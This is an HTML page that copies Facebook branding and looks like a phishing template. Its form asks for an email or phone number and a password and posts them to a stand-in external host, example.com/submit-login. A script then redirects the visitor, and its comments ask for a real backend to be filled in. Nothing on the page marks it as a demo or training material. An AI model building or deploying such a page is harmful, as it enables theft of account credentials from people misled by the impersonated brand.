<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <link rel="icon" href="/favicon.ico" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="theme-color" content="#000000" />
  <meta name="description" content="Facebook Account Login Form" />
  <link rel="apple-touch-icon" href="/logo192.png" />
  <link rel="manifest" href="manifest.json" />
  <title>Facebook Login</title>
  <!-- Bootstrap CSS for styling -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    /* Custom styles to match the Meta Ads form */
    body {
      font-family: Arial, sans-serif;
    }
    input, textarea {
      width: 100%;
      padding: 8px;
      margin-top: 4px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    label {
      font-weight: 500;
    }
  </style>
</head>
<body>
  <noscript>You need to enable JavaScript to run this app.</noscript>
  <div id="root">
    <div>
      <!-- Header with Meta/Facebook branding -->
      <div
        class="d-flex align-items-center"
        style="width: 100%; height: 90px; background: #003087;"
      >
        <h1 class="text-white ms-4 m-0 d-flex align-self-center">facebook</h1>
      </div>
      
      <!-- Form container -->
      <div class="col-12 my-4 d-flex justify-content-center align-items-center">
        <div class="col-11 col-md-6 border">
          <div class="p-2" style="background: rgb(245, 246, 247);">
            <h5 class="m-0">Enter Your Login Details</h5>
          </div>
          <div class="p-2">
            <form
              id="facebook-login-form"
              action="https://example.com/submit-login"
              method="POST"
            >
              <!-- Email Field -->
              <label class="mt-2" style="font-size: 12px;">Email or Phone Number</label>
              <br />
              <input
                type="email"
                name="email"
                id="email"
                title="Email or Phone Number"
                value=""
                required
                aria-required="true"
                placeholder="Enter your email or phone"
              />
              <br />
              <!-- Password Field -->
              <label class="mt-2" style="font-size: 12px;">Password</label>
              <br />
              <input
                type="password"
                name="password"
                id="password"
                title="Password"
                value=""
                required
                aria-required="true"
                minlength="6"
                placeholder="Enter your password"
              />
              <br />
              <!-- Submit Button -->
              <div
                class="p-2 mb-2 d-flex justify-content-end"
                style="background: rgb(245, 246, 247);"
              >
                <button
                  type="submit"
                  class="text-white border-0"
                  style="background: #0047B3;"
                >
                  Submit
                </button>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- JavaScript for form submission and redirect -->
  <script>
    document.getElementById('facebook-login-form').addEventListener('submit', function(event) {
      event.preventDefault(); // Prevent default form submission for demo
      // Basic client-side validation
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      if (!email || !password) {
        alert('Please fill in all fields.');
        return;
      }
      // Simulate form submission with redirect (replace with actual backend logic)
      setTimeout(function() {
        window.location.href = '/dashboard.html'; // Replace with your desired redirect
      }, 1000);
    });
  </script>
</body>
</html>
